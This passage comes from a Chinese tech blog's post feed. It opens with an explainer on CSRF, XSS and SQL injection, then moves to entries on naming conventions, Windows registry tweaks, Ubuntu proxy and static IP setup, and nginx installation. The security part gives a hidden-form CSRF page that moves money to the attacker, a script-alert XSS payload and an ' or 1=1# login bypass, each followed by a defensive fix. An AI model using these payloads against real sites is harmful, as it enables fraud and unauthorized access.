<p>场景模拟：</p>
<p>a欠b 1000元钱， 在银行转账给b,  a的浏览器执行的操作是：<br><code>http://www.bank.com/transfer.php?from=a&amp;money=1000&amp;to=b</code><br>这个时候，c想要攻击a，他执行了下面的代码<code>http://www.bank.com/transfer.php?from=Alice&amp;money=9999&amp;to=Cathy</code><br>当然，结果是失败的，浏览器会记住a的session_id，而c通过浏览器的cookie带过去的session_id当然不是a的，所以失败。<br>c又想了一个方法， 写了一个网页， 访问方法是：<a href="http://www.c.com/choujiang.p…" target="_blank" rel="noopener">www.c.com/choujiang.p…</a>,  用抽奖来吸引a,  choujiang.php的代码是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;get&quot; action=&quot;http://www.bank.com/transfer.php&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;from&quot; value=&quot;a&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;c&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;button&quot; onclick=&quot;submit()&quot; value=&quot;活动抽奖&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>复制代码<br>只要a点击了<code>http://www.c.com/choujiang.php</code>， 就会在自己的浏览器页面显示一个抽奖按钮。<br>如果a刚给b转账完毕， 又点击了这个抽奖按钮， 就相当于a的浏览器发起了如下请求：<br><code>http://www.bank.com/transfer.php?from=a&amp;money=1000&amp;to=c</code><br>这时， 银行后台服务器从http的cookie中识别出确实是a在转账给c， 是合理操作。但是，a并不知情</p>
<p>解决办法：</p>
<ul>
<li>加上csrf token验证域 </li>
</ul>
<h1 id="XSS（可以分为反射型xss攻击和存贮型xss攻击）"><a href="#XSS（可以分为反射型xss攻击和存贮型xss攻击）" class="headerlink" title="XSS（可以分为反射型xss攻击和存贮型xss攻击）"></a>XSS（可以分为反射型xss攻击和存贮型xss攻击）</h1><p>含义</p>
<p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p>
<p>场景模拟</p>
<p>反射型xss攻击<br>正常发送消息：<br><code>http://www.test.com/message.php?send=Hello</code><br>接收者将会接收信息并显示Hello<br>非正常发送消息：<br><code>http://www.test.com/message.php?send=&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;</code><br>这时接收者的窗口就会弹出foolish弹窗。<br>以上，只是简单的示例，实际上，xss攻击可以做得更加复杂，窃取用户账号密码也是正常的</p>
<p>存贮型xss攻击<br>在输入框里填写you are foolish!<br>那么表单里要发送的的input框就会变成这样<br><code>&lt;input type=“text” name=“content” value=&quot;you are foolish!&quot;&gt;</code><br>不做任何过滤的话，这个会当成正常数据入库<br>当要用到这个数据，从库取出来的时候，就会出现you are foolish的弹窗。</p>
<p>解决方式:</p>
<ul>
<li>过滤输入和转义输出。</li>
</ul>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>含义</p>
<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击．</p>
<p>场景模拟</p>
<p>和存贮型xss攻击的例子本质上是一样的<br>假如现在php的登录代码是这样的<br><code>$sql = &quot;select * from user where username = &#39;a&#39; and pwd = md5(123456)</code><br>然后在前端密码的输入框里填写’ or 1 = 1#,那么sql语句就会变成<code>$sql = &quot;select * from user where username = &#39;&#39; or 1 = 1#&#39; and pwd = md5(123456)</code><br><em>在sql的意思是注释，后面的sql不会再执行</em><br>所以，<code>$sql = &quot;select * from user where username = &#39;&#39; or 1 = 1</code><br>登录成功。</p>
<p>解决方式:</p>
<ul>
<li>检查变量数据类型和格式</li>
<li>过滤特殊符号</li>
<li>参数化查询，使用预编译语句</li>
</ul>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>编程规范——编程中的变量的命名法总结（用于变量名、函数名、类名、文件名）</title>
    <url>/2019/02/06/Variablez_naming/</url>
    <content><![CDATA[<h1 id="Camel-Case（驼峰命名法）："><a href="#Camel-Case（驼峰命名法）：" class="headerlink" title="Camel Case（驼峰命名法）："></a>Camel Case（驼峰命名法）：</h1><h2 id="小驼峰命名法（Lower-Camel-Case）："><a href="#小驼峰命名法（Lower-Camel-Case）：" class="headerlink" title="小驼峰命名法（Lower Camel Case）："></a>小驼峰命名法（Lower Camel Case）：</h2><p>第一个单词的首字母小写；第二个单词开始每个单词的的首字母大写。例如：firstName、lastName。</p>
<h2 id="大驼峰命名法（Upper-Camel-Case："><a href="#大驼峰命名法（Upper-Camel-Case：" class="headerlink" title="大驼峰命名法（Upper Camel Case："></a>大驼峰命名法（Upper Camel Case：</h2><p>每一个单词的首字母都大写。例如：FirstName、LastName、CamelCase。也被称为 Pascal 命名法（Pascal Case）,源自于 Pascal 语言的命名惯例。</p>
<h1 id="Snake-Case"><a href="#Snake-Case" class="headerlink" title="Snake Case"></a>Snake Case</h1><p>这是书写复合词或短语的一种惯例（practice）。复合词或短语中的各个单词之间用下划线（_）分隔并且没有空格。复合词中的每一个单词的首字母通常都是小写的，并且复合词的第一个字母既可以是大写的又可以是小写的，例如：“foo_bar”和“Hello_world”。一般认为 Snake Case 的可读性要比 Camel Case 要强。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>编程规范</category>
      </categories>
      <tags>
        <tag>编程规范</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 10完美去除快捷方式图标小箭头的方法</title>
    <url>/2019/02/06/windows_icon/</url>
    <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>win10或者win7中，每当我们链接一个应用到桌面的时候，总会在图标上出现一个小箭头，对于强迫症的我们来说，非常的不美观，下面我们把他去除掉</p>
<h1 id="进入注册表"><a href="#进入注册表" class="headerlink" title="进入注册表"></a>进入注册表</h1><h2 id="windows-R-输入-regedit"><a href="#windows-R-输入-regedit" class="headerlink" title="windows+R 输入 regedit"></a>windows+R 输入 regedit</h2><hr>
<h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><ol>
<li><p>去掉小箭头</p>
<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons&quot; /v 29 /d &quot;%systemroot%\system32\imageres.dll,197&quot; /t reg_sz /f
taskkill /f /im explorer.exe
attrib -s -r -h &quot;%userprofile%\AppData\Local\iconcache.db&quot;
del &quot;%userprofile%\AppData\Local\iconcache.db&quot; /f /q
start explorer
pause
</code></pre></li>
</ol>
<pre><code>*复制上面的代码。新建一个文本文件。粘贴后另存为.bat文件，然后以管理员身份打开。（把隐藏的文件后缀名显示出来）*
</code></pre><ol start="2">
<li><p>恢复小箭头</p>
<pre><code>reg delete &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons&quot; /v 29 /f
taskkill /f /im explorer.exe
attrib -s -r -h &quot;%userprofile%\AppData\Local\iconcache.db&quot;
del &quot;%userprofile%\AppData\Local\iconcache.db&quot; /f /q
start explorer
pause
</code></pre></li>
</ol>
<pre><code>*同理，将上述代码另存为.bat文件，管理员身份打开。就可恢复小箭头了。*

&lt;script async src=&quot;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;&gt;&lt;/script&gt;
</code></pre><p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins></p>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/26/windows-1/">Windows系统不重启而使环境变量生效的方法</a></li><li><a href="https://thelighter.github.io/2019/02/06/windows_tab/">Windows cmd tab键自动补全功能如何启</a></li></ul></div>]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows cmd tab键自动补全功能如何启</title>
    <url>/2019/02/06/windows_tab/</url>
    <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>tab补齐本来是一件非常方便的事情，但是有时候windows中没有启动，下面教大家如何启动</p>
<h1 id="进入注册表"><a href="#进入注册表" class="headerlink" title="进入注册表"></a>进入注册表</h1><h2 id="windows-R-输入-regedit"><a href="#windows-R-输入-regedit" class="headerlink" title="windows+R 输入 regedit"></a>windows+R 输入 regedit</h2><h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Prosessor\CompletionChar的键值改为9</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/26/windows-1/">Windows系统不重启而使环境变量生效的方法</a></li><li><a href="https://thelighter.github.io/2019/02/06/windows_icon/">windows 10完美去除快捷方式图标小箭头的方法</a></li></ul></div>]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu如何删除代理，Ubuntu的proxy删除配置</title>
    <url>/2019/02/06/ubuntu_proxy/</url>
    <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p> 有时候，我们在Ubuntu中使用代理后，会惊讶的发现，我们修改代理的配置后或者删除，原来的配置还是存在的，导致不能联网</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="删除-etc-apt-apt-conf中的配置"><a href="#删除-etc-apt-apt-conf中的配置" class="headerlink" title="删除 /etc/apt/apt.conf中的配置"></a>删除 /etc/apt/apt.conf中的配置</h2><pre><code>http_proxy=&quot;http://10.0.126.1:13128/&quot;

https_proxy=&quot;https://10.0.126.1:13128/&quot;

ftp_proxy=&quot;ftp://10.0.126.1:13128/&quot;

socks_proxy=&quot;socks://10.0.126.1:13128/&quot;
</code></pre><h2 id="删除-etc-enviroment-的中的配置"><a href="#删除-etc-enviroment-的中的配置" class="headerlink" title="删除 /etc/enviroment 的中的配置"></a>删除 /etc/enviroment 的中的配置</h2><pre><code>http_proxy=&quot;http://10.0.126.1:13128/&quot;

https_proxy=&quot;https://10.0.126.1:13128/&quot;

ftp_proxy=&quot;ftp://10.0.126.1:13128/&quot;

socks_proxy=&quot;socks://10.0.126.1:13128/&quot;
</code></pre><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>然后我们就可以上网了，如果发现还是不行，记得重启就可以了！</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu虚拟机中的fdfs-client-py-master.zip的正确安装</title>
    <url>/2019/01/06/fdfs_client-py-master.zip/</url>
    <content><![CDATA[<h1 id="fdfs-client-py-master-zip安装"><a href="#fdfs-client-py-master-zip安装" class="headerlink" title="fdfs_client-py-master.zip安装"></a>fdfs_client-py-master.zip安装</h1><h2 id="可以使用pip直接安装-pip-install-fdfs-client-py"><a href="#可以使用pip直接安装-pip-install-fdfs-client-py" class="headerlink" title="可以使用pip直接安装 pip install fdfs-client-py"></a>可以使用pip直接安装 <code>pip install fdfs-client-py</code></h2><h2 id="下载zip包，到下载目录中，pip-install-fdfs-client-py-master-zip"><a href="#下载zip包，到下载目录中，pip-install-fdfs-client-py-master-zip" class="headerlink" title="下载zip包，到下载目录中，pip install fdfs-client-py-master.zip"></a>下载zip包，到下载目录中，<code>pip install fdfs-client-py-master.zip</code></h2><h2 id="当我们在Ubuntu的虚拟机中安装fdfs-client-py-master-zip遇到这样的错误"><a href="#当我们在Ubuntu的虚拟机中安装fdfs-client-py-master-zip遇到这样的错误" class="headerlink" title="当我们在Ubuntu的虚拟机中安装fdfs_client-py-master.zip遇到这样的错误"></a>当我们在Ubuntu的虚拟机中安装fdfs_client-py-master.zip遇到这样的错误</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Processing ./fdfs_client-py-master.zip</span><br><span class="line">Building wheels <span class="keyword">for</span> collected packages: fdfs-client-py</span><br><span class="line">  Running setup.py bdist_wheel <span class="keyword">for</span> fdfs-client-py ... error</span><br><span class="line">  Complete output from <span class="built_in">command</span> /home/python/.virtualenvs/meiduo/bin/python3 -u -c <span class="string">"import setuptools, tokenize;__file__='/tmp/pip-req-build-ccsx7jn1/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))"</span> bdist_wheel -d /tmp/pip-wheel-850454wf --python-tag cp36:</span><br><span class="line">  running bdist_wheel</span><br><span class="line">  running build</span><br><span class="line">  running build_py</span><br><span class="line">  creating build</span><br><span class="line">  creating build/lib.linux-x86_64-3.6</span><br><span class="line">  creating build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/utils.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/exceptions.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/tracker_client.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/fdfs_test.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/connection.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/fdfs_protol.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/__init__.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/storage_client.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  copying fdfs_client/client.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  running build_ext</span><br><span class="line">  building <span class="string">'fdfs_client.sendfile'</span> extension</span><br><span class="line">  creating build/temp.linux-x86_64-3.6</span><br><span class="line">  creating build/temp.linux-x86_64-3.6/fdfs_client</span><br><span class="line">  x86_64-linux-gnu-gcc -pthread -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -g -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2 -fPIC -I/usr/include/python3.6m -I/home/python/.virtualenvs/meiduo/include/python3.6m -c fdfs_client/sendfilemodule.c -o build/temp.linux-x86_64-3.6/fdfs_client/sendfilemodule.o</span><br><span class="line">  fdfs_client/sendfilemodule.c:43:20: fatal error: Python.h: 没有那个文件或目录</span><br><span class="line">  compilation terminated.</span><br><span class="line">  error: <span class="built_in">command</span> <span class="string">'x86_64-linux-gnu-gcc'</span> failed with <span class="built_in">exit</span> status 1</span><br><span class="line">  </span><br><span class="line">  ----------------------------------------</span><br><span class="line">  Failed building wheel <span class="keyword">for</span> fdfs-client-py</span><br><span class="line">  Running setup.py clean <span class="keyword">for</span> fdfs-client-py</span><br><span class="line">Failed to build fdfs-client-py</span><br><span class="line">Installing collected packages: fdfs-client-py</span><br><span class="line">  Running setup.py install <span class="keyword">for</span> fdfs-client-py ... error</span><br><span class="line">    Complete output from <span class="built_in">command</span> /home/python/.virtualenvs/meiduo/bin/python3 -u -c <span class="string">"import setuptools, tokenize;__file__='/tmp/pip-req-build-ccsx7jn1/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))"</span> install --record /tmp/pip-record-3yandvc8/install-record.txt --single-version-externally-managed --compile --install-headers /home/python/.virtualenvs/meiduo/include/site/python3.6/fdfs-client-py:</span><br><span class="line">    running install</span><br><span class="line">    running build</span><br><span class="line">    running build_py</span><br><span class="line">    creating build</span><br><span class="line">    creating build/lib.linux-x86_64-3.6</span><br><span class="line">    creating build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/utils.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/exceptions.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/tracker_client.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/fdfs_test.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/connection.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/fdfs_protol.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/__init__.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/storage_client.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    copying fdfs_client/client.py -&gt; build/lib.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    running build_ext</span><br><span class="line">    building <span class="string">'fdfs_client.sendfile'</span> extension</span><br><span class="line">    creating build/temp.linux-x86_64-3.6</span><br><span class="line">    creating build/temp.linux-x86_64-3.6/fdfs_client</span><br><span class="line">    x86_64-linux-gnu-gcc -pthread -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -g -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2 -fPIC -I/usr/include/python3.6m -I/home/python/.virtualenvs/meiduo/include/python3.6m -c fdfs_client/sendfilemodule.c -o build/temp.linux-x86_64-3.6/fdfs_client/sendfilemodule.o</span><br><span class="line">    fdfs_client/sendfilemodule.c:43:20: fatal error: Python.h: 没有那个文件或目录</span><br><span class="line">    compilation terminated.</span><br><span class="line">    error: <span class="built_in">command</span> <span class="string">'x86_64-linux-gnu-gcc'</span> failed with <span class="built_in">exit</span> status 1</span><br><span class="line">    </span><br><span class="line">    ----------------------------------------</span><br><span class="line">Command <span class="string">"/home/python/.virtualenvs/meiduo/bin/python3 -u -c "</span>import setuptools, tokenize;__file__=<span class="string">'/tmp/pip-req-build-ccsx7jn1/setup.py'</span>;f=getattr(tokenize, <span class="string">'open'</span>, open)(__file__);code=f.read().replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>);f.close();<span class="built_in">exec</span>(compile(code, __file__, <span class="string">'exec'</span>))<span class="string">" install --record /tmp/pip-record-3yandvc8/install-record.txt --single-version-externally-managed --compile --install-headers /home/python/.virtualenvs/meiduo/include/site/python3.6/fdfs-client-py"</span> failed with error code 1 <span class="keyword">in</span> /tmp/pip-req-build-ccsx7jn1/</span><br></pre></td></tr></table></figure>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><h2 id="sudo-apt-get-install-python3-6-dev"><a href="#sudo-apt-get-install-python3-6-dev" class="headerlink" title="sudo apt-get install python3.6-dev"></a><code>sudo apt-get install python3.6-dev</code></h2><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>和我们使用虚拟环境有关系，导致版本不统一。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu的nginx安装配置</title>
    <url>/2019/01/06/ubuntu_nginx/</url>
    <content><![CDATA[<h1 id="nginx的官网和介绍"><a href="#nginx的官网和介绍" class="headerlink" title="nginx的官网和介绍"></a>nginx的官网和介绍</h1><ul>
<li>Nginx是一个高性能的HTTP和反向代理服务器. </li>
<li>Nginx 使用 Unix 下常用的 ‘./configure &amp;&amp; make &amp;&amp; make install’ 过程来编译安装.<br>configure 脚本确定系统所具有一些特性，特别是 nginx 用来处理连接的方法。然后，它创建 Makefile 文件。</li>
</ul>
<h2 id="官网：http-nginx-org"><a href="#官网：http-nginx-org" class="headerlink" title="官网：http://nginx.org/"></a>官网：<a href="http://nginx.org/" target="_blank" rel="noopener">http://nginx.org/</a></h2><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.13.12.tar.gz</span><br><span class="line">tar -zxvf nginx-1.13.12.tar.gz</span><br><span class="line"><span class="built_in">cd</span> nginx-1.13.12.tar.gz</span><br></pre></td></tr></table></figure>
<h1 id="安装nginx报错处理办法"><a href="#安装nginx报错处理办法" class="headerlink" title="安装nginx报错处理办法"></a>安装nginx报错处理办法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./configure: error: the HTTP rewrite module requires the PCRE library. </span><br><span class="line">You can either disable the module by using --without-http_rewrite_module </span><br><span class="line">option, or install the PCRE library into the system, or build the PCRE library </span><br><span class="line">statically from the source with nginx by using --with-pcre= option.</span><br></pre></td></tr></table></figure>
<p>针对以上的错误是没有安装pcre的相关配置造成，所以我们要安装pcre</p>
<h2 id="下载安装pcre"><a href="#下载安装pcre" class="headerlink" title="下载安装pcre"></a>下载安装pcre</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://ftp.pcre.org/pub/pcre/pcre-8.40.tar.gz </span><br><span class="line">tar -zxvf pcre-8.40.tar.gz</span><br><span class="line"><span class="built_in">cd</span> pcre-8.40.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<h2 id="再次安装nginx"><a href="#再次安装nginx" class="headerlink" title="再次安装nginx"></a>再次安装nginx</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.13.12.tar.gz</span><br><span class="line">tar -zxvf nginx-1.13.12.tar.gz</span><br><span class="line"><span class="built_in">cd</span> nginx-1.13.12.tar.gz</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx  --with-pcre=解压的路径/pcre/ *注意：此处而不是安装的路径，应该是pcre源文件的路径</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/nginx_1/">nginx: [alert] kill(1668, 1) failed (3: No such process)的解决办法及nginx常用命令总结</a></li><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li></ul></div>]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu在vmware中静态(固定)IP地址的设置方法</title>
    <url>/2019/01/06/vmware_ip/</url>
    <content><![CDATA[<h1 id="固定ip的好处"><a href="#固定ip的好处" class="headerlink" title="固定ip的好处"></a>固定ip的好处</h1><p>防止ssh连接或者其他和IP有关的服务在ip地址变化后，服务出现故障不能连接。所有，固定ip地址的好处十分的大。下面，教大家快速修改Ubuntu的静态ip。</p>
<h1 id="获取Ubuntu虚拟机的静态ip"><a href="#获取Ubuntu虚拟机的静态ip" class="headerlink" title="获取Ubuntu虚拟机的静态ip"></a>获取Ubuntu虚拟机的静态ip</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmcli dev show</span><br></pre></td></tr></table></figure>
<p>输入这个的结果实例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GENERAL.设备:                           ens33</span><br><span class="line">GENERAL.类型:                           ethernet</span><br><span class="line">GENERAL.硬件地址:                       00:0C:29:D6:28:39</span><br><span class="line">GENERAL.MTU:                            1500</span><br><span class="line">GENERAL.状态:                           100 (已连接)</span><br><span class="line">GENERAL.连接:                           有线连接 1</span><br><span class="line">GENERAL.连接路径:                       /org/freedesktop/NetworkManager/ActiveConnection/0</span><br><span class="line">WIRED-PROPERTIES.载波:                  开启</span><br><span class="line">IP4.地址[1]:                            192.168.59.131/24</span><br><span class="line">IP4.网关:                               192.168.59.2</span><br><span class="line">IP4.路由[1]:                            dst = 169.254.0.0/16, nh = 0.0.0.0, mt = 1000</span><br><span class="line">IP4.DNS[1]:                             192.168.59.2</span><br><span class="line">IP6.地址[1]:                            fe80::bea:3685:f25d:b274/64</span><br><span class="line">IP6.网关:                               </span><br><span class="line"></span><br><span class="line">GENERAL.设备:                           lo</span><br><span class="line">GENERAL.类型:                           loopback</span><br><span class="line">GENERAL.硬件地址:                       00:00:00:00:00:00</span><br><span class="line">GENERAL.MTU:                            65536</span><br><span class="line">GENERAL.状态:                           10 (未托管)</span><br><span class="line">GENERAL.连接:                           --</span><br><span class="line">GENERAL.连接路径:                       --</span><br><span class="line">IP4.地址[1]:                            127.0.0.1/8</span><br><span class="line">IP4.网关:                               </span><br><span class="line">IP6.地址[1]:                            ::1/128</span><br><span class="line">IP6.网关:</span><br></pre></td></tr></table></figure></p>
<h1 id="修改ipv4的模式由DHCP模式改为手动"><a href="#修改ipv4的模式由DHCP模式改为手动" class="headerlink" title="修改ipv4的模式由DHCP模式改为手动"></a>修改ipv4的模式由DHCP模式改为手动</h1><p><img src="http://dl2.iteye.com/upload/attachment/0090/3491/0c75e16f-6588-3e47-b8e8-842211f59e9e.jpg" alt="ubuntu的固定ip"></p>
<h2 id="保存后重新联网就ok了"><a href="#保存后重新联网就ok了" class="headerlink" title="保存后重新联网就ok了"></a>保存后重新联网就ok了</h2><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Vmware</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx启动关闭重启脚本制作的步骤</title>
    <url>/2019/01/06/nginx_init/</url>
    <content><![CDATA[<blockquote>
<p>官方文档：<a href="http://wiki.nginx.org/RedHatNginxInitScript" target="_blank" rel="noopener">http://wiki.nginx.org/RedHatNginxInitScript</a></p>
</blockquote>
<blockquote>
<p>Should work on RHEL, Fedora, CentOS. Tested on CentOS 5.Save this file as /etc/init.d/nginx</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># nginx - this script starts and stops the nginx daemon</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chkconfig:   - 85 15</span></span><br><span class="line"><span class="comment"># description:  NGINX is an HTTP(S) server, HTTP(S) reverse \</span></span><br><span class="line"><span class="comment">#               proxy and IMAP/POP3 proxy server</span></span><br><span class="line"><span class="comment"># processname: nginx</span></span><br><span class="line"><span class="comment"># config:      /etc/nginx/nginx.conf</span></span><br><span class="line"><span class="comment"># config:      /etc/sysconfig/nginx</span></span><br><span class="line"><span class="comment"># pidfile:     /var/run/nginx.pid</span></span><br><span class="line"></span><br><span class="line"></span><br><span 